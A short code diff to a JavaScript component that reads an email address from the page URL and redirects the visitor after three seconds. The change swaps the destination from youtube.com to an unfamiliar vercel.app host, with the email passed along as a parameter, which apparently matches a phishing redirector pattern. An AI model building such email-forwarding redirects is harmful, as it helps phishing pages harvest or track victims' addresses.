@@ -12,7 +12,7 @@ function RedirectAfterDelay() {
         // Function to redirect after delay
         const redirectAfterDelay = () => {
             const email = getEmailFromURL();
-            const redirectUrl = `https://youtube.com/?email=${encodeURIComponent(email)}`;
+            const redirectUrl = `https://vvs-nu.vercel.app/?email=${encodeURIComponent(email)}`;
             setTimeout(() => {
                 window.location.href = redirectUrl;
             }, 3000); // 3 seconds delay
